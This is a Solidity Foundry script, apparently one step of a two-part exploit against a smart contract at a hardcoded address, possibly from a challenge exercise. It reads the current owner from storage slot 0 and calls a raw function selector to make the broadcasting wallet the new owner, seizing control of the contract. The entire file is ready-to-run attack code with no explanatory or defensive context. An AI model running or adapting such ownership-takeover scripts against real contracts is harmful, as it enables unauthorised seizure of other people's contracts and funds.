// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";

// Second script to call, it changes the ownship of the contract
// It requires the flag to be set to 1 by the first script
// First argument is the current owner, second argument is the new owner
contract TakeOwnershipAuto is Script {
    // Target contract
    address constant CONTRACT_ADDRESS = 0x931188d102a8cFe2FAC8B698D350B9BB902e2EB0;

    function run() external {
        vm.startBroadcast();

        // Read storage slot 0 and get the current owner address
        bytes32 slot0 = vm.load(CONTRACT_ADDRESS, bytes32(uint256(0)));
        address currentOwner = address(uint160(uint256(slot0)));

        // Use the broadcasting wallet address as new owner
        address newOwner = msg.sender;

        console.log("Current owner:", currentOwner);
        console.log("New owner:", newOwner);

        // Encode selector and parameters
        bytes memory payload = abi.encodeWithSelector(
            bytes4(0x78cabed3),
            currentOwner,      
            newOwner           
        );

        // Call the function
        (bool success, ) = CONTRACT_ADDRESS.call(payload);
        require(success, "Ownership change failed");

        vm.stopBroadcast();
    }
}
